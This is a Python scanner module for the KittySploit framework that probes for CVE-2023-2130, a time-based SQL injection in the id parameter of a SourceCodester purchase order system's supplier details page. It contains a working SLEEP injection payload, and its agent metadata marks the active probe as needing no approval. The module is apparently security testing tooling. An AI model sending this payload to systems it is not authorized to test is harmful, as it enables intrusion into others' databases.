#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as critical has been found in SourceCodester Purchase Order Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Purchase Order Management v1.0 - SQL Injection Detection',
        'description': 'A vulnerability classified as critical has been found in SourceCodester Purchase Order Management System 1.0. Affected is an unknown function of the file /admin/suppliers/view_details.php of the component GET Parameter Handler. The manipulation of the argument id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-226206 is the identifier assigned to this vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'time-based-sqli',
            'cve2023',
            'sqli',
            'purchase-order-management-system',
            'purchase_order_management_system_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/zitozito1/bug_report/blob/main/SQLi.md',
            'https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-2130',
            'https://vuldb.com/?ctiid.226206',
            'https://vuldb.com/?id.226206',
        ],
        'cve': 'CVE-2023-2130',
    }

    def run(self):
        path = "/admin/suppliers/view_details.php?id=1'+AND+(SELECT+9687+FROM+(SELECT(SLEEP(6)))pnac)+AND+'ARHJ'='ARHJ"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Supplier Name',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason='Purchase Order Management v1.0 - SQL Injection detected',
                path=path,
            )
            return True
        return False

